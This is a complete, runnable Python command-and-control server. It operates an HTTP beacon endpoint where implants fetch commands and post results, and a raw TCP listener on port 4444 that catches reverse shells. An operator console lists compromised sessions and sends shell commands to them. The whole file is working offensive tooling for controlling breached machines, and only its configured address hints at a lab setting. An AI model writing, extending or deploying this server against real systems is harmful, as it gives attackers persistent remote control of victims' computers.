#!/usr/bin/env python3
import http.server
import socketserver
import socket
import threading
import sys
import time
import re
import os
from select import select

# --- Configuration ---
HOST = "192.168.122.1"
HTTP_PORT = 8080
RAW_TCP_PORT = 4444
IMPLANT_TIMEOUT = 30

# --- Global State ---
http_sessions = {}
shell_sessions = {}
shell_id_counter = 0
current_session = None
global_lock = threading.Lock()

# ==============================================================================
# SECTION 1: HTTP C2 Server
# ==============================================================================
class C2Handler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_GET(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return

        path = self.path.strip("/")
        with global_lock:
            if uid not in http_sessions:
                http_sessions[uid] = {"last_cmd": "None", "output": "", "last_seen": time.time(), "cwd": None}
                sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                sys.stdout.flush()
            http_sessions[uid]["last_seen"] = time.time()

        self._set_headers()
        parts = uid.split('-')
        if len(parts) >= 2:
            beacon_path = parts[0]
            command_fetch_path = parts[1]
            if path == command_fetch_path:
                with global_lock:
                    cmd = http_sessions[uid].get("last_cmd", "None")
                    http_sessions[uid]["last_cmd"] = "None"
                self.wfile.write(cmd.encode())
                return
            elif path == beacon_path:
                self.wfile.write(b"OK")
                return
        self.wfile.write(b"None")

    def do_POST(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return

        length = int(self.headers.get("Content-Length", 0))
        raw_data = self.rfile.read(length).decode(errors="ignore")
        if re.fullmatch(r"(\d+\s*)+", raw_data.strip()):
            try:
                byte_values = [int(b) for b in raw_data.strip().split()]
                decoded_output = bytes(byte_values).decode("utf-8", errors="ignore")
            except Exception:
                decoded_output = raw_data
        else:
            decoded_output = raw_data

        with global_lock:
            if uid in http_sessions:
                http_sessions[uid]["output"] = decoded_output
                http_sessions[uid]["last_seen"] = time.time()
                if current_session == ('http', uid):
                    sys.stdout.write(f"\r{decoded_output.strip()}\nC2 > ")
                    sys.stdout.flush()

        self._set_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return

class ThreadingTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def run_http_server():
    with ThreadingTCPServer((HOST, HTTP_PORT), C2Handler) as httpd:
        print(f"[+] Starting HTTP C2 on {HOST}:{HTTP_PORT}")
        httpd.serve_forever()

def monitor_http_implants():
    global current_session
    while True:
        time.sleep(10)
        with global_lock:
            disconnected_uids = [uid for uid, data in http_sessions.items() if time.time() - data["last_seen"] > IMPLANT_TIMEOUT]
            for uid in disconnected_uids:
                sys.stdout.write(f"\r[-] HTTP implant {uid} has disconnected (timeout).\n")
                if current_session == ('http', uid):
                    current_session = None
                    sys.stdout.write(f"[*] You have been logged out from {uid}.\n")
                if uid in http_sessions:
                    del http_sessions[uid]
                sys.stdout.write("C2 > ")
                sys.stdout.flush()

def handle_shell_connection(client_socket, address, shell_id):
    global current_session
    while True:
        try:
            ready_to_read, _, _ = select([client_socket], [], [], 1)
            if ready_to_read:
                data = client_socket.recv(4096)
                if not data:
                    raise ConnectionResetError
                with global_lock:
                    is_current = current_session == ('shell', shell_id)
                if is_current:
                    sys.stdout.write(data.decode(errors='ignore'))
                    sys.stdout.flush()
        except (ConnectionResetError, BrokenPipeError, OSError):
            with global_lock:
                is_current = current_session == ('shell', shell_id)
                if shell_id in shell_sessions:
                    del shell_sessions[shell_id]
                sys.stdout.write(f"\r[-] Shell {shell_id} ({address[0]}) has disconnected.\n")
                if is_current:
                    current_session = None
                    sys.stdout.write(f"[*] You have been logged out from shell {shell_id}.\n")
                sys.stdout.write("C2 > ")
                sys.stdout.flush()
            client_socket.close()
            break

def run_raw_tcp_server():
    global shell_id_counter
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, RAW_TCP_PORT))
    server_socket.listen(5)
    print(f"[+] Starting Raw TCP Listener on {HOST}:{RAW_TCP_PORT} for reverse shells.")
    while True:
        client_socket, address = server_socket.accept()
        with global_lock:
            shell_id_counter += 1
            shell_id = shell_id_counter
            shell_sessions[shell_id] = {'socket': client_socket, 'address': address}
            sys.stdout.write(f"\r[+] New Shell connection (ID: {shell_id}) from {address[0]}:{address[1]}\nC2 > ")
            sys.stdout.flush()
        threading.Thread(target=handle_shell_connection, args=(client_socket, address, shell_id), daemon=True).start()

def c2_console():
    global current_session
    list_map = {}
    print("\n[*] C2 Console Started. Type 'help' for commands.")
    while True:
        try:
            prompt = "C2 > "
            with global_lock:
                if current_session and current_session[0] == 'shell':
                    prompt = ""
            cmd_input = input(prompt)
            with global_lock:
                if current_session and current_session[0] == 'shell':
                    shell_id = current_session[1]
                    if shell_id in shell_sessions:
                        shell_socket = shell_sessions[shell_id]['socket']
                        shell_socket.sendall((cmd_input + '\n').encode())
                    else:
                        print("\r[*] Current shell has disconnected. Use 'list' and 'select'.")
                        current_session = None
                    continue
            cmd_input = cmd_input.strip()
            if not cmd_input:
                continue
            
            if cmd_input.lower() in ('help', '?'):
                print("Commands:\n"
                      "  list          - List all active sessions (HTTP and Shells).\n"
                      "  select <ID>   - Select a session to interact with.\n"
                      "  exit          - Exit the C2 server.\n"
                      "  <any other>   - Command to send to the selected HTTP implant.")
                continue
            
            if cmd_input.lower() == "list":
                list_map.clear()
                i = 1
                print("\n--- Active Sessions ---")
                print("ID  Type   Target                    Last Seen/Info")
                print("--  ----   ------------------------  -----------------")
                with global_lock:
                    for uid, data in http_sessions.items():
                        delta = int(time.time() - data["last_seen"])
                        print(f"{i:<3} HTTP   {uid:<24} {delta}s ago")
                        list_map[i] = ('http', uid)
                        i += 1
                    for shell_id, data in shell_sessions.items():
                        addr_str = f"{data['address'][0]}:{data['address'][1]}"
                        print(f"{i:<3} SHELL  {f'ID: {shell_id}':<24} {addr_str}")
                        list_map[i] = ('shell', shell_id)
                        i += 1
                if not list_map:
                    print("[!] No active sessions.")
                print()
                continue
            
            if cmd_input.lower().startswith("select "):
                try:
                    selection_id = int(cmd_input.split(maxsplit=1)[1])
                    if selection_id in list_map:
                        current_session = list_map[selection_id]
                        session_type, session_id = current_session
                        if session_type == 'shell':
                            print(f"[+] Interacting with shell {session_id}. You are now in direct shell mode.")
                        else:
                            print(f"[+] Selected implant {session_id}")
                    else:
                        print("[!] Invalid selection ID.")
                except (ValueError, IndexError):
                    print("[!] Invalid format. Use 'select <ID>' from the 'list' command.")
                continue
            
            if cmd_input.lower() in ("exit", "quit"):
                print("[*] Shutting down C2 server.")
                sys.exit(0)
            
            if not current_session:
                print("[!] No session selected. Use 'list' and 'select <ID>'.")
                continue
            
            if current_session[0] == 'http':
                uid = current_session[1]
                with global_lock:
                    if uid in http_sessions:
                        if cmd_input.startswith("cd"):
                            parts = cmd_input.split(maxsplit=1)
                            new_dir = None
                            if len(parts) == 1:
                                http_sessions[uid]['cwd'] = None
                            else:
                                arg = parts[1].strip()
                                if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
                                    arg = arg[1:-1]
                                current_cwd = http_sessions[uid].get('cwd')
                                if arg.startswith('/'):
                                    new_dir = os.path.normpath(arg)
                                else:
                                    base_dir = current_cwd if current_cwd else "."
                                    new_dir = os.path.normpath(os.path.join(base_dir, arg))
                                http_sessions[uid]['cwd'] = new_dir
                        else:
                            cwd = http_sessions[uid].get('cwd')
                            to_send = f'cd "{cwd}" && {cmd_input}' if cwd else cmd_input
                            http_sessions[uid]['last_cmd'] = to_send
                    else:
                        print(f"[!] HTTP implant {uid} is no longer active.")
                        current_session = None
        except KeyboardInterrupt:
            with global_lock:
                if current_session and current_session[0] == 'shell':
                    print(f"\n[*] Disengaging from shell {current_session[1]}. Type 'list' to see sessions.")
                    current_session = None
                    continue
            print("\n[*] Keyboard interrupt received, exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] An error occurred: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    threading.Thread(target=run_http_server, daemon=True).start()
    threading.Thread(target=monitor_http_implants, daemon=True).start()
    threading.Thread(target=run_raw_tcp_server, daemon=True).start()
    time.sleep(1)
    c2_console()
